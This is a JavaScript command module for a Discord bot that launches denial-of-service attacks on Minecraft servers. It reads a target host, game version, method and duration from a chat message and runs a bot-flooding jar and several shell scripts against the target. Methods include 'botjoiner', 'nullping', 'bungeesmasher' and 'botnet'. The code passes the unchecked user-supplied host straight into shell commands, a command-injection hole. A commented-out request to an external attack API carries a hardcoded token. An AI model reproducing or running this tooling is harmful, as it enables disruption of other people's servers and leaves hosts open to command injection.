const Discord = require("discord.js");

const shell = require('shelljs');

const http = require('http');

const XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;



exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]

const ip = host?.split(":")[0]

const ports = host?.split(":")[1]

const protokol = message.content.split (" ")[2]

const methods = message.content.split (" ")[3]

const time = message.content.split (" ")[4]

const config = require('../config.json');

var primary_room = config.commandroom;

var secondary_room = config.secondary_commandroom;

var version = config.versionbot;

var img = config.img;

var photo = config.photo;

var rolebasic = config.rolebasic;

const test = (methods || '').toLowerCase();

const test2 = (protokol || '').toLowerCase();

const port = (ports || '25565');

const times = (time || '60');

var idrole = config.premium;

var idrole1 = config.advanced;

let role = message.member.roles.cache.has(idrole);

let role1 = message.member.roles.cache.has(idrole1);





// var url = "https://api.mcstorm.net/start_attack";



// var xhr = new XMLHttpRequest();

// xhr.open("POST", url);



// xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");



// xhr.onreadystatechange = function () {

   // if (xhr.readyState === 4) {

      // console.log(xhr.status);

      // console.log(xhr.responseText);

   // }};



   

if (message.channel.id != primary_room && message.channel.id != secondary_room) {

	return;

  }



if(!args[0]) {

	message.reply("You have to use  `.attack lenni0451.net:25565 1.8 random`");

	return;

}







if(!args[1]) {

	message.reply("You Have To select the version that you want to send the bots");

	return;
	}

if(!/^[0-9]/.test(protokol)) {

	message.reply("there is no version that match with that");

	return;

}



if(!args[2]) {

	message.reply("you have to select the method");

	return;

}



if(!/\b((120)|[1-9]\d?)\b/.test(times)) {

	message.reply("Time limit is from 1-120 seconds!");

	return;

}



	if (test === "join" || test === "legitjoin" || test === "localhost" || test === "invalidnames" || test === "longnames" || test === "botjoiner" || test === "spoof" || test === "ping" || test === "bypass" || test === "multikiller" || test === "handshake" || test === "motd" || test === "tcp" || test === "bigpacket" || test === "waterfall" || test === "randombytes" || test === "extremejoin" || test === "random" ||test === "nettydowner" || test === "ram" || test === "aegis" || test === "nullping" || test === "tcphit" || test === "queue" || test === "botnet" || test === "tcpbypass" || test === "bungeesmasher" || test === "overload" || test === "nantibot" || test2 === "1.20.1" || test2 === "1.20" || test2 === "1.19.4" || test2 === "1.19.3" || test2 === "1.19.2" || test2 === "1.19.1" || test2 === "1.19" || test2 === "1.18.2" || test2 === "1.18.1" ||  test2 === "1.18" || test2 === "1.17.1" || test2 === "1.17" || test2 === "1.16.5" || test2 === "1.16.4" || test2 === "1.16.3" || test2 === "1.16.2" || test2 === "1.16.1" || test2 === "1.16" || test2 === "1.15.2" || test2 === "1.15.1" || test2 === "1.15" || test2 === "1.14.4" || test2 === "1.14.3" || test2 === "1.14.2" || test2 === "1.14.1" || test2 === "1.14" || test2 === "1.13.2" || test2 === "1.13.1" || test2 === "1.13" || test2 === "1.12.2" || test2 === "1.12.1" || test2 === "1.12" || test2 === "1.11.2" || test2 === "1.11.1" || test2 === "1.11" || test2 === "1.10.2" || test2 === "1.10.1" || test2 === "1.10" || test2 === "1.9.4" || test2 === "1.9.3" || test2 === "1.9.2" || test2 === "1.9.1" || test2 === "1.9" || test2 === "1.8.9" || test2 === "1.8.8" || test2 === "1.8.7" || test2 === "1.8.6" || test2 === "1.8.5" || test2 === "1.8.4" || test2 === "1.8.3" || test2 === "1.8.2" || test2 === "1.8.1" || test2 === "1.8") {

		if (Math.floor(new Date().getTime() / 1000) - attack_1 < times && Math.floor(new Date().getTime() / 1000) - attack_2 < times) {

			message.channel.send('**You can\'t start an ATTACK right now!**\n\n`2/2 ATTACKS` are in progress! Try again when are less than 2 attacks running!')

			return;

		}	

		var protocol = test2.replace("1.20.2", "764")
		
		    .replace("1.20.1", "763")

		    .replace("1.20", "763")

			   .replace("1.19.4", "762")

			   .replace("1.19.3", "761")

			   .replace("1.19.2", "760")

			   .replace("1.19.1", "760")

			   .replace("1.19", "759")

			   .replace("1.18.2", "758")

			   .replace("1.18.1", "757")

			   .replace("1.18", "757")

			   .replace("1.17.1", "756")

			   .replace("1.17", "755")

			   .replace("1.16.5", "754")

			   .replace("1.16.4", "754")

			   .replace("1.16.3", "753")

			   .replace("1.16.2", "751")

			   .replace("1.16.1", "736")

			   .replace("1.16", "735")

			   .replace("1.15.2", "578")

			   .replace("1.15.1", "575")

			   .replace("1.15", "573")

			   .replace("1.14.4", "498")

			   .replace("1.14.3", "490")

			   .replace("1.14.2", "485")

			   .replace("1.14.1", "480")

			   .replace("1.14", "477")

			   .replace("1.13.2", "404")

			   .replace("1.13.1", "401")

			   .replace("1.13", "393")

			   .replace("1.12.2", "340")

			   .replace("1.12.1", "338")

			   .replace("1.12", "335")

			   .replace("1.11.2", "316")

			   .replace("1.11.1", "316")

			   .replace("1.11", "315")

			   .replace("1.10.2", "210")

			   .replace("1.10.1", "210")

			   .replace("1.10", "210")

			   .replace("1.9.4", "110")

			   .replace("1.9.3", "110")

			   .replace("1.9.2", "109")

			   .replace("1.9.1", "108")

			   .replace("1.9", "107")

			   .replace("1.8.9", "47")

			   .replace("1.8.8", "47")

			   .replace("1.8.7", "47")

			   .replace("1.8.6", "47")

			   .replace("1.8.5", "47")

			   .replace("1.8.4", "47")

			   .replace("1.8.3", "47")

			   .replace("1.8.2", "47")

			   .replace("1.8.1", "47")

			   .replace("1.8", "47")

			   
var protocol2 = test2.replace("764", "1.20.2")
      .replace("763", "1.20.1")

		    .replace("763", "1.20")

			   .replace("762", "1.19.4")

			   .replace("761", "1.19.3")

			   .replace("760", "1.19.2")

			   .replace("760", "1.19.1")

			   .replace("759", "1.19")

			   .replace("758", "1.18.2")

			   .replace("757", "1.18.1")

			   .replace("757", "1.18")

			   .replace("756", "1.17.1")

			   .replace("755", "1.17")

			   .replace("754", "1.16.5")

			   .replace("754", "1.16.4")

			   .replace("753", "1.16.3")

			   .replace("751", "1.16.2")

			   .replace("736", "1.16.1")

			   .replace("735", "1.16")

			   .replace("578", "1.15.2")

			   .replace("575", "1.15.1")

			   .replace("573", "1.15")

			   .replace("498", "1.14.4")

			   .replace("490", "1.14.3")

			   .replace("485", "1.14.2")

			   .replace("480", "1.14.1")

			   .replace("477", "1.14")

			   .replace("404", "1.13.2")

			   .replace("401", "1.13.1")

			   .replace("393", "1.13")

			   .replace("340", "1.12.2")

			   .replace("338", "1.12.1")

			   .replace("335", "1.12")

			   .replace("316", "1.11.2")

			   .replace("316", "1.11.1")

			   .replace("315", "1.11")

			   .replace("210", "1.10.2")

			   .replace("210", "1.10.1")

			   .replace("210", "1.10")

			   .replace("110", "1.9.4")

			   .replace("110", "1.9.3")

			   .replace("109", "1.9.2")

			   .replace("108", "1.9.1")

			   .replace("107", "1.9")

			   .replace("47", "1.8.9")

			   .replace("47", "1.8.8")

			   .replace("47", "1.8.7")

			   .replace("47", "1.8.6")

			   .replace("47", "1.8.5")

			   .replace("47", "1.8.4")

			   .replace("48", "1.8.3")

			   .replace("47", "1.8.2")

			   .replace("47", "1.8.1")

			   .replace("47", "1.8")

			   

   

		

		var chetmemay = test.replace("join", "join")

		       .replace("join", "join")

			   .replace("legitjoin", "legitjoin")

			   .replace("localhost", "localhost")

			   .replace("invalidnames", "invalidnames")

			   .replace("longnames", "longnames")

			   .replace("botjoiner", "botjoiner")

			   .replace("spoof", "spoof")

			   .replace("ping", "ping")

			   .replace("bypass", "bypass")

			   .replace("multikiller", "multikiller")

			   .replace("handshake", "handshake")

			   .replace("motd", "motd")

			   .replace("tcp", "tcp")

			   .replace("bigpacket", "bigpacket")

			   .replace("waterfall", "waterfall")

			   .replace("randombytes", "randombytes")

			   .replace("extremejoin", "extremejoin")

			   .replace("random", "random")

			   .replace("nettydowner", "nettydowner")

			   .replace("ram", "ram")

			   .replace("aegis", "aegis")

			   .replace("nullping", "nullping")

			   .replace("tcphit", "tcphit")

			   .replace("queue", "queue")

			   .replace("botnet", "botnet")

			   .replace("bungeesmasher", "bungeesmasher")

			   .replace("overload", "overload")

			   .replace("nantibot", "nantibot")

			   

		  var miniflex = test.replace("join", "JOIN")

		       .replace("join", "JOIN")

		       .replace("legitjoin", "LEGİTJOIN")

		       .replace("localhost", "LOCALHOST")

		       .replace("invalidnames", "INVALIDNAMES")

		       .replace("longnames", "LONGNAMES")

		       .replace("botjoiner", "BOTJOINER")

		       .replace("spoof", "SPOOF")

		       .replace("ping", "PING")

		       .replace("bypass", "BYPASS")

		       .replace("multikiller", "MULTIKILLER")

		       .replace("handshake", "HANDSHAKE")

		       .replace("motd", "MOTD")

		       .replace("tcp", "TCP")

		       .replace("bigpacket", "BIGPACKET")

		       .replace("waterfall", "WATERFALL")

		       .replace("randombytes", "RANDOMBYTES")

		       .replace("extremejoin", "EXTREMEJOIN")

		       .replace("random", "RANDOM")

		       .replace("nettydowner", "NETTYDOWNER")

		       .replace("ram", "RAM")

		       .replace("aegis", "AEGIS")

		       .replace("nullping", "NULLPING")

		       .replace("tcphit", "TCPHIT")

		       .replace("queue", "QUEUE")

		       .replace("botnet", "BOTNET")

		       .replace("bungeesmasher", "BUNGEESMASHER")

		       .replace("overload", "OVERLOAD")

		       .replace("nantibot", "NANTIBOT")

			   

			   const embed = new Discord.MessageEmbed()

					.setColor('#2ECC71')

					.setTitle("MCBOT V1.0")

					.setDescription("```ip: " + host + " \nversion: " + protocol2 + " \nmethod: " + miniflex + " \nBot: Unlimited \nTime: " + times + "s```")

					.setImage("https://mcapi.us/server/image?ip=" + ip + "&port=" + port + "&theme=dark&title=MCBOT")

			   

			   const embed1 = new Discord.MessageEmbed()

					.setColor('#f69513')

					.setTitle(":cloud_lightning: ATTACK STARTED!")

					.addFields(

					{ name: ':ghost: Bot Name', value: 'MCBOT', inline: true },

					{ name: ':link: Server', value: host, inline: true },

					{ name: ':lock: Version', value: protocol2, inline: true },

					{ name: ':boom: Method', value: miniflex, inline: true },

					{ name: ':rocket: Bot', value: 'Unlimited', inline: true },

					{ name: ':alarm_clock: Duration', value: '60s', inline: true },

					)

					.setFooter({

						text: `It can take up to 5 seconds to start this attack!`,

						iconURL: img

					})

					.setImage("https://mcapi.us/server/image?ip=" + ip + "&port=" + port + "&theme=dark&title=MCBOT")

				

				var exec = require('child_process').exec

					exec(`java -Xmx4G -Xms4G -Dperdelay=5000 -Ddelay=3 -Drmnwp=false -jar FLEXBOT.jar ${host} ${protocol} ${chetmemay} ${times} -1 MCBOT`, (error, stdout, stderr) => {

				});

				

				exec(`cd /root/flexbot_linux/machines && screen -dmS minecraft_server timeout 10 ./dedv1.sh start java ${host} ${protocol} ${chetmemay} ${times} -1 MCBOT`)

				exec(`cd /root/flexbot_linux/machines && screen -dmS minecraft_server timeout 10 ./dedv2.sh start java ${host} ${protocol} ${chetmemay} ${times} -1 MCBOT`)

				exec(`cd /root/flexbot_linux/machines && screen -dmS minecraft_server timeout 10 ./dedv3.sh start java ${host} ${protocol} ${chetmemay} ${times} -1 MCBOT`)

				

				// var data = "token=15L4YHUR9ANB9AQQAL98OPVZLTZSDK831RD4BLLUJ0NVTLKGFV0FQZLYTELZF967&ipport=" + host + "&protocol=" + protocol + "&time=60&method=ping&network=2&concurrent=1";

				

				// xhr.send(data);

				

				message.channel.send({embeds : [embed1]});



				if (Math.floor(new Date().getTime() / 1000) - attack_1 > times) attack_1 = Math.floor(new Date().getTime() / 1000);

				else if (Math.floor(new Date().getTime() / 1000) - attack_2 > times) attack_2 = Math.floor(new Date().getTime() / 1000);

				return;

	} else {

		message.reply(test + " doesn't exist");

		return;

	}

}





function validateTextNumericInRange (textInputId) {

    var textInput = document.getElementById(textInputId);

    var value = parseInt(textInput.value, 10);



    return (!isNaN(value) && value >= 1 && value <= 120);

}



exports.conf = {

  enabled: true,

  guildOnly: false,

  aliases: ['attack'],

  permLevel: 0

}



exports.help = {

  name: 'attack',

  description: 'Lệnh Tấn Công',

  usage: 'attack'

}
